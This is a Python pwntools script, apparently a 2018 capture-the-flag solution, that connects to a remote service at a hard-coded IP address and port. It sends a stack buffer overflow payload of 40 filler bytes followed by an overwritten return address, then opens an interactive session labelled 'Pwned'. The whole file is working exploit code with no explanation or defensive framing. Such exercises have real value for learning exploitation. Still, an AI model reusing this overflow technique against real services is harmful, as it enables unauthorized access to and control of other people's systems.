# -*- coding: utf-8 -*-
#!/usr/bin/env python
#   Version 
#   Author: WildfootW
#   GitHub: github.com/Wildfoot
#   Copyright (C) 2018 WildfootW All rights reserved.
#

from pwn import *

context.arch = "amd64"
context.os = "linux"
context.endian = "little"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"

is_local = False

host = "104.199.235.135"
port = 2111
if is_local:
    host = "127.0.0.1"
    port = 8888
r = remote(host, port)

input("Attach in gdb and press Enter")

reply_address = 0x0400796
payload = flat(["A" * 40, reply_address])
log.info("payload: " + str(payload))

r.recvuntil(": ")
r.sendline(payload)
r.recvuntil(": ")
r.sendline("WildfootW")

r.interactive("Pwned # ")

